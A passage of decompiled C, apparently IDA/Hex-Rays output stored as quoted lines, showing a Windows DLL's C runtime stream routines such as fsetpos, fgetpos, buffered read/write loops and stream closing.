    "}",
    "",
    "",
    "__int64 __fastcall sub_18001F5B0(__int64 a1, _QWORD *a2, __int64 a3, _QWORD *a4)",
    "{",
    "  sub_180017470(*a2);",
    "  LODWORD(a3) = sub_18001F5F0(a3);",
    "  sub_18001747C(*a4);",
    "  return (unsigned int)a3;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001F5F0(__int64 a1)",
    "{",
    "  unsigned __int64 v2; // rsi",
    "  __int64 v3; // rax",
    "  __int64 v4; // rcx",
    "  __int64 v5; // rdi",
    "",
    "  v2 = **(_QWORD **)a1 & 0xFFFFFFFFFFFFFFFEuLL;",
    "  sub_18001F3E0(**(_QWORD **)(a1 + 8), *(_QWORD *)(a1 + 16));",
    "  sub_180023DC4(**(_QWORD **)(a1 + 8));",
    "  _InterlockedAnd((volatile signed __int32 *)(**(_QWORD **)(a1 + 8) + 20LL), 0xFFFFF81F);",
    "  if ( (**(_BYTE **)(a1 + 24) & 4) != 0 )",
    "  {",
    "    v3 = **(_QWORD **)(a1 + 8);",
    "    v4 = v3 + 28;",
    "    _InterlockedOr((volatile signed __int32 *)(v3 + 20), 0x400u);",
    "    *(_DWORD *)(v3 + 32) = 2;",
    "LABEL_8:",
    "    *(_QWORD *)v3 = v4;",
    "    *(_QWORD *)(v3 + 8) = v4;",
    "    goto LABEL_9;",
    "  }",
    "  v4 = **(_QWORD **)(a1 + 32);",
    "  if ( v4 )",
    "  {",
    "    v3 = **(_QWORD **)(a1 + 8);",
    "    _InterlockedOr((volatile signed __int32 *)(v3 + 20), 0x180u);",
    "    *(_DWORD *)(v3 + 32) = v2;",
    "    goto LABEL_8;",
    "  }",
    "  v5 = sub_1800232FC(v2, 1);",
    "  sub_180023374(0);",
    "  if ( !v5 )",
    "  {",
    "    ++dword_18004D2E0;",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "  v3 = **(_QWORD **)(a1 + 8);",
    "  _InterlockedOr((volatile signed __int32 *)(v3 + 20), 0x140u);",
    "  *(_DWORD *)(v3 + 32) = v2;",
    "  *(_QWORD *)v3 = v5;",
    "  *(_QWORD *)(v3 + 8) = v5;",
    "LABEL_9:",
    "  *(_DWORD *)(v3 + 16) = 0;",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001F6D8(__int64 a1, __int64 a2, int a3, __int64 a4)",
    "{",
    "  unsigned int v4; // edi",
    "  int v5; // ebx",
    "  int v6; // ebx",
    "  _QWORD v8[2]; // [rsp+30h] [rbp-39h] BYREF",
    "  char v9; // [rsp+40h] [rbp-29h]",
    "  __int128 v10; // [rsp+48h] [rbp-21h]",
    "  char v11; // [rsp+58h] [rbp-11h]",
    "  int v12; // [rsp+5Ch] [rbp-Dh]",
    "  char v13; // [rsp+60h] [rbp-9h]",
    "  int v14; // [rsp+64h] [rbp-5h]",
    "  char v15; // [rsp+68h] [rbp-1h]",
    "  __int64 v16; // [rsp+70h] [rbp+7h] BYREF",
    "  __int64 v17; // [rsp+78h] [rbp+Fh] BYREF",
    "  __int64 v18; // [rsp+80h] [rbp+17h] BYREF",
    "  _QWORD v19[7]; // [rsp+88h] [rbp+1Fh] BYREF",
    "  int v20; // [rsp+D0h] [rbp+67h] BYREF",
    "  __int64 v21; // [rsp+D8h] [rbp+6Fh] BYREF",
    "  char v22; // [rsp+E0h] [rbp+77h] BYREF",
    "  __int64 v23; // [rsp+E8h] [rbp+7Fh] BYREF",
    "",
    "  v8[0] = 0;",
    "  v9 = 0;",
    "  v11 = 0;",
    "  v13 = 0;",
    "  v15 = 0;",
    "  if ( !dword_18004DC98 )",
    "  {",
    "    v11 = 1;",
    "    v10 = *(_OWORD *)&off_18004B498;",
    "  }",
    "  v21 = a4;",
    "  v20 = a3;",
    "  v16 = a2;",
    "  v23 = a1;",
    "  if ( a1 && (a3 == 4 || (!a3 || a3 == 64) && (unsigned __int64)(a4 - 2) <= 0x7FFFFFFD) )",
    "  {",
    "    v17 = a1;",
    "    v19[0] = &v21;",
    "    v18 = a1;",
    "    v19[1] = &v23;",
    "    v19[2] = v8;",
    "    v19[3] = &v20;",
    "    v19[4] = &v16;",
    "    v4 = sub_18001F5B0((__int64)&v22, &v18, (__int64)v19, &v17);",
    "  }",
    "  else",
    "  {",
    "    v13 = 1;",
    "    v12 = 22;",
    "    sub_18001A598(0, 0, 0, 0, 0, (__int64)v8);",
    "    v4 = -1;",
    "  }",
    "  if ( v11 == 2 )",
    "    *(_DWORD *)(v8[0] + 936LL) &= ~2u;",
    "  if ( v13 )",
    "  {",
    "    v5 = v12;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v8) + 32) = v5;",
    "  }",
    "  if ( v15 )",
    "  {",
    "    v6 = v14;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v8) + 36) = v6;",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "int __cdecl fsetpos(FILE *Stream, const fpos_t *Position)",
    "{",
    "  if ( Stream && Position )",
    "    return sub_18001FAB8(Stream, *Position, 0);",
    "  *(_DWORD *)sub_18001A80C() = 22;",
    "  invalid_parameter_noinfo();",
    "  return -1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001F848(__int64 a1, __int64 a2, unsigned int a3, __int64 a4)",
    "{",
    "  unsigned int v9; // edi",
    "",
    "  if ( a1 && a3 <= 2 )",
    "  {",
    "    sub_180017470(a1);",
    "    v9 = sub_18001F9CC(a1, a2, a3, a4);",
    "    sub_18001747C(a1);",
    "    return v9;",
    "  }",
    "  else",
    "  {",
    "    *(_BYTE *)(a4 + 48) = 1;",
    "    *(_DWORD *)(a4 + 44) = 22;",
    "    sub_18001A598(0, 0, 0, 0, 0, a4);",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "}",
    "",
    "",
    "char __fastcall sub_18001F8E4(__int64 a1, signed __int64 a2, int a3)",
    "{",
    "  __int64 v5; // r10",
    "  __int64 v6; // rcx",
    "  __int64 v7; // r9",
    "  __int64 v8; // rcx",
    "  __int64 v9; // rdx",
    "  unsigned __int64 v10; // rcx",
    "  unsigned __int64 v11; // rdi",
    "  unsigned __int64 v12; // rdx",
    "  __int64 v13; // rdx",
    "  char result; // al",
    "",
    "  if ( a3 == 2 )",
    "    return 0;",
    "  if ( (*(_DWORD *)(a1 + 20) & 0x4C0) == 0 )",
    "    return 0;",
    "  if ( (*(_DWORD *)(a1 + 20) & 6) != 0 )",
    "    return 0;",
    "  if ( *(int *)(a1 + 16) <= 0 )",
    "    return 0;",
    "  v5 = *(int *)(a1 + 24);",
    "  v6 = *(_DWORD *)(a1 + 24) & 0x3F;",
    "  v7 = qword_18004D870[v5 >> 6];",
    "  if ( *(char *)(v7 + 72 * v6 + 56) < 0 || *(_BYTE *)(v7 + 72 * v6 + 57) )",
    "    return 0;",
    "  if ( !a3 )",
    "  {",
    "    v8 = sub_1800294D0((unsigned int)v5, 0, 1);",
    "    if ( v8 < 0 )",
    "      return 0;",
    "    v9 = a2;",
    "    v10 = v8 - *(int *)(a1 + 16);",
    "    v11 = (unsigned __int64)a2 >> 63;",
    "    v12 = v9 - v10;",
    "    if ( (_DWORD)v11 != v10 >> 63 && (_DWORD)v11 != v12 >> 63 )",
    "      return 0;",
    "    a2 = v12;",
    "  }",
    "  if ( *(_QWORD *)(a1 + 8) - *(_QWORD *)a1 <= a2 )",
    "  {",
    "    v13 = *(int *)(a1 + 16);",
    "    if ( a2 <= v13 )",
    "    {",
    "      *(_QWORD *)a1 += a2;",
    "      result = 1;",
    "      *(_DWORD *)(a1 + 16) = v13 - a2;",
    "      return result;",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001F9CC(__int64 a1, signed __int64 a2, int a3, __int64 a4)",
    "{",
    "  unsigned int v5; // ebp",
    "  signed __int64 v6; // r14",
    "  __int64 result; // rax",
    "  int v9; // esi",
    "",
    "  v5 = a3;",
    "  v6 = a2;",
    "  if ( (*(_DWORD *)(a1 + 20) & 0x2000) != 0 )",
    "  {",
    "    _InterlockedAnd((volatile signed __int32 *)(a1 + 20), 0xFFFFFFF7);",
    "    v9 = 0;",
    "    if ( sub_18001F8E4(a1, a2, a3) )",
    "    {",
    "      return 0;",
    "    }",
    "    else",
    "    {",
    "      if ( v5 == 1 )",
    "      {",
    "        v6 += sub_180029B04(a1, a4);",
    "        v5 = 0;",
    "      }",
    "      sub_18001F3E0(a1, a4);",
    "      *(_QWORD *)a1 = *(_QWORD *)(a1 + 8);",
    "      *(_DWORD *)(a1 + 16) = 0;",
    "      if ( (*(_DWORD *)(a1 + 20) & 4) != 0 )",
    "      {",
    "        _InterlockedAnd((volatile signed __int32 *)(a1 + 20), 0xFFFFFFFC);",
    "      }",
    "      else if ( (*(_BYTE *)(a1 + 20) & 0x41) == 0x41 && (*(_DWORD *)(a1 + 20) & 0x100) == 0 )",
    "      {",
    "        *(_DWORD *)(a1 + 32) = 512;",
    "      }",
    "      LOBYTE(v9) = sub_18002956C(*(unsigned int *)(a1 + 24), v6, v5, a4) != -1;",
    "      return (unsigned int)(v9 - 1);",
    "    }",
    "  }",
    "  else",
    "  {",
    "    *(_BYTE *)(a4 + 48) = 1;",
    "    result = 0xFFFFFFFFLL;",
    "    *(_DWORD *)(a4 + 44) = 22;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001FAB8(__int64 a1, __int64 a2, unsigned int a3)",
    "{",
    "  unsigned int v3; // edi",
    "  int v4; // ebx",
    "  int v5; // ebx",
    "  _QWORD v7[2]; // [rsp+20h] [rbp-40h] BYREF",
    "  char v8; // [rsp+30h] [rbp-30h]",
    "  __int128 v9; // [rsp+38h] [rbp-28h]",
    "  char v10; // [rsp+48h] [rbp-18h]",
    "  int v11; // [rsp+4Ch] [rbp-14h]",
    "  char v12; // [rsp+50h] [rbp-10h]",
    "  int v13; // [rsp+54h] [rbp-Ch]",
    "  char v14; // [rsp+58h] [rbp-8h]",
    "",
    "  v7[0] = 0;",
    "  v8 = 0;",
    "  v10 = 0;",
    "  v12 = 0;",
    "  v14 = 0;",
    "  if ( !dword_18004DC98 )",
    "  {",
    "    v10 = 1;",
    "    v9 = *(_OWORD *)&off_18004B498;",
    "  }",
    "  v3 = sub_18001F848(a1, a2, a3, (__int64)v7);",
    "  if ( v10 == 2 )",
    "    *(_DWORD *)(v7[0] + 936LL) &= ~2u;",
    "  if ( v12 )",
    "  {",
    "    v4 = v11;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v7) + 32) = v4;",
    "  }",
    "  if ( v14 )",
    "  {",
    "    v5 = v13;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v7) + 36) = v5;",
    "  }",
    "  return v3;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001FB50(__int64 a1, int a2, unsigned int a3)",
    "{",
    "  unsigned int v3; // edi",
    "  int v4; // ebx",
    "  int v5; // ebx",
    "  _QWORD v7[2]; // [rsp+20h] [rbp-40h] BYREF",
    "  char v8; // [rsp+30h] [rbp-30h]",
    "  __int128 v9; // [rsp+38h] [rbp-28h]",
    "  char v10; // [rsp+48h] [rbp-18h]",
    "  int v11; // [rsp+4Ch] [rbp-14h]",
    "  char v12; // [rsp+50h] [rbp-10h]",
    "  int v13; // [rsp+54h] [rbp-Ch]",
    "  char v14; // [rsp+58h] [rbp-8h]",
    "",
    "  v7[0] = 0;",
    "  v8 = 0;",
    "  v10 = 0;",
    "  v12 = 0;",
    "  v14 = 0;",
    "  if ( !dword_18004DC98 )",
    "  {",
    "    v10 = 1;",
    "    v9 = *(_OWORD *)&off_18004B498;",
    "  }",
    "  v3 = sub_18001F848(a1, a2, a3, (__int64)v7);",
    "  if ( v10 == 2 )",
    "    *(_DWORD *)(v7[0] + 936LL) &= ~2u;",
    "  if ( v12 )",
    "  {",
    "    v4 = v11;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v7) + 32) = v4;",
    "  }",
    "  if ( v14 )",
    "  {",
    "    v5 = v13;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v7) + 36) = v5;",
    "  }",
    "  return v3;",
    "}",
    "",
    "",
    "int __cdecl fgetpos(FILE *Stream, #87 *Position)",
    "{",
    "  int v2; // ebx",
    "  __int64 v5; // rax",
    "",
    "  v2 = 0;",
    "  if ( Stream && Position )",
    "  {",
    "    v5 = sub_180029A68();",
    "    *(_QWORD *)Position = v5;",
    "    LOBYTE(v2) = v5 != -1;",
    "    return v2 - 1;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    return -1;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001FC38(__int64 a1, _QWORD *a2, __int64 a3, _QWORD *a4)",
    "{",
    "  __int64 v6; // rdi",
    "",
    "  sub_180017470(*a2);",
    "  v6 = sub_18001FC78(a3);",
    "  sub_18001747C(*a4);",
    "  return v6;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001FC78(__int64 **a1)",
    "{",
    "  __int64 *v2; // rsi",
    "  __int64 v3; // rbp",
    "  char v4; // di",
    "  __int64 v5; // rax",
    "  __int64 v6; // rcx",
    "  __int64 v7; // rbx",
    "",
    "  v2 = a1[1];",
    "  v3 = **a1;",
    "  v4 = sub_180025E38(v3);",
    "  v5 = sub_18001FD94(*a1[2], *a1[3], *a1[4], **a1, (__int64)a1[1]);",
    "  LOBYTE(v6) = v4;",
    "  v7 = v5;",
    "  sub_180025F00(v6, v3, v2);",
    "  return v7;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001FCF8(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)",
    "{",
    "  __int64 v5; // rax",
    "  __int64 v7; // [rsp+28h] [rbp-48h]",
    "  _BYTE v8[8]; // [rsp+30h] [rbp-40h] BYREF",
    "  __int64 v9; // [rsp+38h] [rbp-38h] BYREF",
    "  __int64 v10; // [rsp+40h] [rbp-30h] BYREF",
    "  _QWORD v11[5]; // [rsp+48h] [rbp-28h] BYREF",
    "  __int64 v12; // [rsp+80h] [rbp+10h] BYREF",
    "  __int64 v13; // [rsp+88h] [rbp+18h] BYREF",
    "  __int64 v14; // [rsp+90h] [rbp+20h] BYREF",
    "  __int64 v15; // [rsp+98h] [rbp+28h] BYREF",
    "",
    "  v15 = a4;",
    "  v14 = a3;",
    "  v13 = a2;",
    "  v12 = a1;",
    "  if ( !a2 || !a3 )",
    "    return 0;",
    "  if ( !a4 )",
    "  {",
    "    v5 = a5;",
    "    v7 = a5;",
    "    *(_BYTE *)(a5 + 48) = 1;",
    "    *(_DWORD *)(v5 + 44) = 22;",
    "    sub_18001A598(0, 0, 0, 0, 0, v7);",
    "    return 0;",
    "  }",
    "  v9 = a4;",
    "  v11[0] = &v15;",
    "  v11[1] = a5;",
    "  v10 = a4;",
    "  v11[2] = &v12;",
    "  v11[3] = &v13;",
    "  v11[4] = &v14;",
    "  return sub_18001FC38((__int64)v8, &v10, (__int64)v11, &v9);",
    "}",
    "",
    "",
    "unsigned __int64 __fastcall sub_18001FD94(char *a1, unsigned __int64 a2, unsigned __int64 a3, __int64 a4, __int64 a5)",
    "{",
    "  char *v8; // r13",
    "  __int64 v9; // rax",
    "  int v11; // r15d",
    "  unsigned __int64 v12; // rdi",
    "  unsigned __int64 v13; // rsi",
    "  bool i; // zf",
    "  int v15; // eax",
    "  __int64 v16; // r14",
    "  unsigned __int64 v17; // rax",
    "  unsigned int v18; // r14d",
    "  unsigned int v19; // eax",
    "  unsigned int v20; // eax",
    "  unsigned int v21; // ecx",
    "  __int64 v22; // [rsp+28h] [rbp-30h]",
    "  unsigned int v23; // [rsp+68h] [rbp+10h]",
    "",
    "  v8 = a1;",
    "  if ( !a2 || !a3 )",
    "    return 0;",
    "  if ( !a4 )",
    "    goto LABEL_4;",
    "  if ( !a1 )",
    "  {",
    "    v9 = a5;",
    "    v22 = a5;",
    "    goto LABEL_5;",
    "  }",
    "  if ( a3 > 0xFFFFFFFFFFFFFFFFuLL / a2 )",
    "  {",
    "LABEL_4:",
    "    v9 = a5;",
    "    v22 = a5;",
    "LABEL_5:",
    "    *(_BYTE *)(v9 + 48) = 1;",
    "    *(_DWORD *)(v9 + 44) = 22;",
    "    sub_18001A598(0, 0, 0, 0, 0, v22);",
    "    return 0;",
    "  }",
    "  if ( (*(_DWORD *)(a4 + 20) & 0x4C0) != 0 )",
    "    v11 = *(_DWORD *)(a4 + 32);",
    "  else",
    "    v11 = 4096;",
    "  v12 = a3 * a2;",
    "  v13 = a3 * a2;",
    "  for ( i = a3 * a2 == 0; !i; i = v13 == 0 )",
    "  {",
    "    if ( (*(_DWORD *)(a4 + 20) & 0xC0) != 0 && (v15 = *(_DWORD *)(a4 + 16)) != 0 )",
    "    {",
    "      if ( v15 < 0 )",
    "        goto LABEL_33;",
    "      if ( (*(_DWORD *)(a4 + 20) & 1) != 0 )",
    "        return (v12 - v13) / a2;",
    "      v16 = v13;",
    "      if ( v13 >= *(int *)(a4 + 16) )",
    "        v16 = *(int *)(a4 + 16);",
    "      sub_180036160(*(_QWORD *)a4, v8, v16);",
    "      *(_DWORD *)(a4 + 16) -= v16;",
    "      v13 -= v16;",
    "      *(_QWORD *)a4 += v16;",
    "    }",
    "    else if ( v13 < (unsigned int)v11 )",
    "    {",
    "      if ( (unsigned int)sub_180028340((unsigned int)*v8, a4, a5) == -1 )",
    "        return (v12 - v13) / a2;",
    "      v11 = *(_DWORD *)(a4 + 32);",
    "      --v13;",
    "      if ( v11 <= 0 )",
    "        v11 = 1;",
    "      v16 = 1;",
    "    }",
    "    else",
    "    {",
    "      if ( (*(_DWORD *)(a4 + 20) & 0xC0) != 0 && (unsigned int)sub_18001F3E0(a4, a5) )",
    "        return (v12 - v13) / a2;",
    "      v17 = v13;",
    "      if ( v11 )",
    "        v17 = v13 - v13 % (unsigned int)v11;",
    "      v18 = -2;",
    "      if ( v17 < 0xFFFFFFFE )",
    "        v18 = v17;",
    "      v23 = v18;",
    "      v19 = sub_180025DAC(a4);",
    "      v20 = sub_180028E38(v19, v8, v18, a5);",
    "      if ( v20 == -1 )",
    "        goto LABEL_33;",
    "      v21 = v20;",
    "      if ( v20 > v18 )",
    "        v21 = v18;",
    "      v16 = v21;",
    "      v13 -= v21;",
    "      if ( v20 < v23 )",
    "      {",
    "LABEL_33:",
    "        _InterlockedOr((volatile signed __int32 *)(a4 + 20), 0x10u);",
    "        return (v12 - v13) / a2;",
    "      }",
    "    }",
    "    v8 += v16;",
    "  }",
    "  return a3;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001FFA8(__int64 a1, __int64 a2, __int64 a3, __int64 a4)",
    "{",
    "  __int64 v4; // rdi",
    "  int v5; // ebx",
    "  int v6; // ebx",
    "  _QWORD v8[2]; // [rsp+30h] [rbp-40h] BYREF",
    "  char v9; // [rsp+40h] [rbp-30h]",
    "  __int128 v10; // [rsp+48h] [rbp-28h]",
    "  char v11; // [rsp+58h] [rbp-18h]",
    "  int v12; // [rsp+5Ch] [rbp-14h]",
    "  char v13; // [rsp+60h] [rbp-10h]",
    "  int v14; // [rsp+64h] [rbp-Ch]",
    "  char v15; // [rsp+68h] [rbp-8h]",
    "",
    "  v8[0] = 0;",
    "  v9 = 0;",
    "  v11 = 0;",
    "  v13 = 0;",
    "  v15 = 0;",
    "  if ( !dword_18004DC98 )",
    "  {",
    "    v11 = 1;",
    "    v10 = *(_OWORD *)&off_18004B498;",
    "  }",
    "  v4 = sub_18001FCF8(a1, a2, a3, a4, (__int64)v8);",
    "  if ( v11 == 2 )",
    "    *(_DWORD *)(v8[0] + 936LL) &= ~2u;",
    "  if ( v13 )",
    "  {",
    "    v5 = v12;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v8) + 32) = v5;",
    "  }",
    "  if ( v15 )",
    "  {",
    "    v6 = v14;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v8) + 36) = v6;",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "unsigned __int64 __fastcall sub_18002004C(",
    "        _BYTE *a1,",
    "        unsigned __int64 a2,",
    "        unsigned __int64 a3,",
    "        unsigned __int64 a4,",
    "        __int64 *a5)",
    "{",
    "  unsigned int v10; // ecx",
    "  unsigned __int64 v11; // rdi",
    "  _BYTE *v12; // r10",
    "  unsigned __int64 v13; // rbp",
    "  unsigned __int64 v14; // r13",
    "  unsigned __int64 v15; // r15",
    "  __int64 v16; // rdx",
    "  unsigned int v17; // r15d",
    "  __int64 v18; // rax",
    "  unsigned int v19; // eax",
    "  int v20; // eax",
    "  int v21; // eax",
    "  _BYTE *v22; // [rsp+20h] [rbp-48h]",
    "  unsigned __int64 v23; // [rsp+88h] [rbp+20h]",
    "  unsigned int v24; // [rsp+90h] [rbp+28h]",
    "",
    "  v23 = a4;",
    "  if ( !a3 || !a4 )",
    "    return 0;",
    "  if ( !a1 )",
    "    goto LABEL_4;",
    "  if ( !a5 || a4 > 0xFFFFFFFFFFFFFFFFuLL / a3 )",
    "  {",
    "    if ( a2 != -1 )",
    "    {",
    "      sub_1800368A0(a1, 0, a2);",
    "      a4 = v23;",
    "    }",
    "    if ( !a5 || a4 > 0xFFFFFFFFFFFFFFFFuLL / a3 )",
    "    {",
    "LABEL_4:",
    "      *(_DWORD *)sub_18001A80C() = 22;",
    "      goto LABEL_5;",
    "    }",
    "  }",
    "  if ( (*((_DWORD *)a5 + 5) & 0x4C0) != 0 )",
    "    v10 = *((_DWORD *)a5 + 8);",
    "  else",
    "    v10 = 4096;",
    "  v24 = v10;",
    "  v11 = a4 * a3;",
    "  v12 = a1;",
    "  v22 = a1;",
    "  v13 = a4 * a3;",
    "  v14 = a2;",
    "  if ( !(a4 * a3) )",
    "    return a4;",
    "  while ( 1 )",
    "  {",
    "    if ( (*((_DWORD *)a5 + 5) & 0x4C0) != 0 )",
    "    {",
    "      v15 = *((int *)a5 + 4);",
    "      if ( (_DWORD)v15 )",
    "      {",
    "        if ( (v15 & 0x80000000) != 0LL )",
    "          goto LABEL_49;",
    "        if ( v13 < v15 )",
    "          v15 = (unsigned int)v13;",
    "        if ( v15 > v14 )",
    "          goto LABEL_46;",
    "        v16 = *a5;",
    "        if ( !v15 )",
    "          goto LABEL_30;",
    "        if ( v12 )",
    "        {",
    "          if ( v16 )",
    "          {",
    "            sub_180036160(v12, v16, (unsigned int)v15);",
    "LABEL_29:",
    "            v12 = v22;",
    "LABEL_30:",
    "            *((_DWORD *)a5 + 4) -= v15;",
    "            v13 -= v15;",
    "            *a5 += v15;",
    "            v10 = v24;",
    "            v14 -= v15;",
    "            goto LABEL_43;",
    "          }",
    "          sub_1800368A0(v12, 0, v14);",
    "        }",
    "        *(_DWORD *)sub_18001A80C() = 22;",
    "        invalid_parameter_noinfo();",
    "        goto LABEL_29;",
    "      }",
    "    }",
    "    if ( v13 < v10 )",
    "      break;",
    "    v17 = v13;",
    "    if ( v13 > 0x7FFFFFFF )",
    "      v17 = 0x7FFFFFFF;",
    "    if ( v10 )",
    "      v17 -= v17 % v10;",
    "    if ( v17 > v14 )",
    "      goto LABEL_46;",
    "    v18 = a5[1];",
    "    *((_DWORD *)a5 + 4) = 0;",
    "    *a5 = v18;",
    "    v19 = sub_180025DAC(a5);",
    "    v20 = sub_18002A0B4(v19, v22, v17);",
    "    if ( !v20 )",
    "    {",
    "      _InterlockedOr((volatile signed __int32 *)a5 + 5, 8u);",
    "      return (v11 - v13) / a3;",
    "    }",
    "    if ( v20 < 0 )",
    "    {",
    "LABEL_49:",
    "      _InterlockedOr((volatile signed __int32 *)a5 + 5, 0x10u);",
    "      return (v11 - v13) / a3;",
    "    }",
    "    v10 = v24;",
    "    v12 = v22;",
    "    v15 = v20;",
    "    v13 -= v20;",
    "    v14 -= v20;",
    "LABEL_43:",
    "    v12 += v15;",
    "    v22 = v12;",
    "    if ( !v13 )",
    "      return v23;",
    "  }",
    "  v21 = sub_180028064(a5, 0x7FFFFFFF);",
    "  if ( v21 == -1 )",
    "    return (v11 - v13) / a3;",
    "  if ( v14 )",
    "  {",
    "    v12 = v22;",
    "    --v13;",
    "    --v14;",
    "    v15 = 1;",
    "    *v22 = v21;",
    "    v10 = *((_DWORD *)a5 + 8);",
    "    v24 = v10;",
    "    goto LABEL_43;",
    "  }",
    "LABEL_46:",
    "  if ( a2 != -1 )",
    "    sub_1800368A0(a1, 0, a2);",
    "  *(_DWORD *)sub_18001A80C() = 34;",
    "LABEL_5:",
    "  invalid_parameter_noinfo();",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800202AC(int a1, int a2, int a3, __int64 a4)",
    "{",
    "  return sub_1800202CC(a1, -1, a2, a3, a4);",
    "}",
    "",
    "",
    "unsigned __int64 __fastcall sub_1800202CC(",
    "        _BYTE *a1,",
    "        unsigned __int64 a2,",
    "        unsigned __int64 a3,",
    "        unsigned __int64 a4,",
    "        __int64 *a5)",
    "{",
    "  unsigned __int64 v10; // rdi",
    "",
    "  if ( !a3 || !a4 )",
    "    return 0;",
    "  if ( !a5 )",
    "  {",
    "    if ( a2 != -1 )",
    "      sub_1800368A0(a1, 0, a2);",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    return 0;",
    "  }",
    "  sub_180017470(a5);",
    "  v10 = sub_18002004C(a1, a2, a3, a4, a5);",
    "  sub_18001747C(a5);",
    "  return v10;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180020374(__int64 a1, __int64 a2)",
    "{",
    "  unsigned int v5; // edi",
    "",
    "  if ( !a1 )",
    "  {",
    "    *(_BYTE *)(a2 + 48) = 1;",
    "    *(_DWORD *)(a2 + 44) = 22;",
    "    sub_18001A598(0, 0, 0, 0, 0, a2);",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "  if ( (*(_DWORD *)(a1 + 20) & 0x1000) != 0 )",
    "  {",
    "    sub_18002A800();",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "  sub_180017470(a1);",
    "  v5 = sub_1800203F0(a1, a2);",
    "  sub_18001747C(a1);",
    "  return v5;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800203F0(__int64 a1, __int64 a2)",
    "{",
    "  unsigned int v5; // esi",
    "  unsigned int v6; // eax",
    "  XSAVE_FORMAT *v7; // rcx",
    "",
    "  if ( a1 )",
    "  {",
    "    v5 = -1;",
    "    if ( (*(_DWORD *)(a1 + 20) & 0x2000) != 0 )",
    "    {",
    "      v5 = sub_18001F3E0(a1, a2);",
    "      sub_180023DC4(a1);",
    "      v6 = sub_180025DAC(a1);",
    "      if ( (int)sub_18002A57C(v6, a2) >= 0 )",
    "      {",
    "        v7 = *(XSAVE_FORMAT **)(a1 + 40);",
    "        if ( v7 )",
    "        {",
    "          sub_180023374(v7);",
    "          *(_QWORD *)(a1 + 40) = 0;",
    "        }",
    "      }",
    "      else",
    "      {",
    "        v5 = -1;",
    "      }",
    "    }",
    "    sub_18002A800(a1);",
    "    return v5;",
    "  }",
    "  else",
    "  {",
    "    *(_BYTE *)(a2 + 48) = 1;",
    "    *(_DWORD *)(a2 + 44) = 22;",
    "    sub_18001A598(0, 0, 0, 0, 0, a2);",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180020498(__int64 a1)",
    "{",
    "  unsigned int v1; // edi",
    "  int v2; // ebx",
    "  int v3; // ebx",
    "  _QWORD v5[2]; // [rsp+20h] [rbp-40h] BYREF",
    "  char v6; // [rsp+30h] [rbp-30h]",
    "  __int128 v7; // [rsp+38h] [rbp-28h]",
    "  char v8; // [rsp+48h] [rbp-18h]",
    "  int v9; // [rsp+4Ch] [rbp-14h]",
    "  char v10; // [rsp+50h] [rbp-10h]",
    "  int v11; // [rsp+54h] [rbp-Ch]",
    "  char v12; // [rsp+58h] [rbp-8h]",
    "",
    "  v5[0] = 0;",
    "  v6 = 0;",
    "  v8 = 0;",
    "  v10 = 0;",
    "  v12 = 0;",
    "  if ( !dword_18004DC98 )",
    "  {",
    "    v8 = 1;",
    "    v7 = *(_OWORD *)&off_18004B498;",
    "  }",
    "  v1 = sub_180020374(a1, (__int64)v5);",
    "  if ( v8 == 2 )",
    "    *(_DWORD *)(v5[0] + 936LL) &= ~2u;",
    "  if ( v10 )",
    "  {",
    "    v2 = v9;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v5) + 32) = v2;",
    "  }",
    "  if ( v12 )",
    "  {",
    "    v3 = v11;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v5) + 36) = v3;",
    "  }",
    "  return v1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180020530(_BYTE *a1, unsigned __int8 *a2)",
    "{",
    "  int v2; // r9d",
    "  unsigned __int8 *v3; // r8",
    "  __int64 v4; // rax",
    "  bool v6; // cf",
    "  unsigned __int8 i; // al",
    "  _BYTE v9[32]; // [rsp+20h] [rbp-38h]",
    "",
    "  v2 = 0;",
    "  v3 = a2;",
    "  v4 = 0;",
    "  v6 = 1;",
    "  do",
    "  {",
    "    if ( !v6 )",
    "    {",
    "      sub_180012348();",
    "      __debugbreak();",
    "    }",
    "    v9[v4++] = 0;",
    "    v6 = (unsigned __int64)v4 < 0x20;",
    "  }",
    "  while ( v4 < 32 );",
    "  for ( i = *a2; i; i = *v3 )",
    "  {",
    "    ++v3;",
    "    v9[(unsigned __int64)i >> 3] |= 1 << (i & 7);",
    "  }",
    "  v9[0] |= 1u;",
    "  while ( ((unsigned __int8)(1 << (*a1 & 7)) & v9[(unsigned __int64)(unsigned __int8)*a1 >> 3]) == 0 )",
    "  {",
    "    ++v2;",
    "    ++a1;",
    "  }",
    "  return v2;",
    "}",
    "",
    "",
